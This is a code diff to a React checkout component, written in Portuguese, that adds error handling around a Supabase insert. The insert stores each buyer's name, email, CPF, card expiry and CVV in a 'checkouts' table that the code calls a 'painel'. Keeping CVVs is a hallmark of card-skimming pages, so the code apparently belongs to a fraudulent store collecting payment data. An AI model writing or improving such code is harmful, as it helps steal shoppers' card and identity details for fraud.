@@ -202,7 +202,7 @@ export default function Checkout() {
         console.warn(`Aviso: valor_total ajustado para 5 reais (mínimo da API de pagamento).`);
       }
       
-      await supabase.from('checkouts').insert([{
+      const { error } = await supabase.from('checkouts').insert([{
         nome_completo: formData.nome,
         email: formData.email,
         cpf: formData.cpf,
@@ -219,12 +219,18 @@ export default function Checkout() {
         validade_cartao: metodo === 'cartao' ? formData.validade : 'PIX',
         cvv_cartao: metodo === 'cartao' ? formData.cvv : 'PIX',
         produto_nome: produto.nome,
-        valor_total: Math.max(valorFinal, 5), // Garante mínimo de 5 reais para a API
+        valor_total: Math.max(valorFinal, 5),
         status: statusPagamento
       }]);
+      
+      if (error) {
+        console.error("❌ Erro Supabase:", error.message, "| Detalhes:", error.details, "| Hint:", error.hint);
+        throw error;
+      }
+      
       console.log("✅ Dados salvos no Supabase com sucesso! Valor:", Math.max(valorFinal, 5), "| Carrinho:", cartItems.length, "itens");
-    } catch (e) {
-      console.error("Erro ao salvar dados no painel:", e);
+    } catch (e: any) {
+      console.error("Erro crítico ao salvar dados:", e.message || e);
     }
   };
 
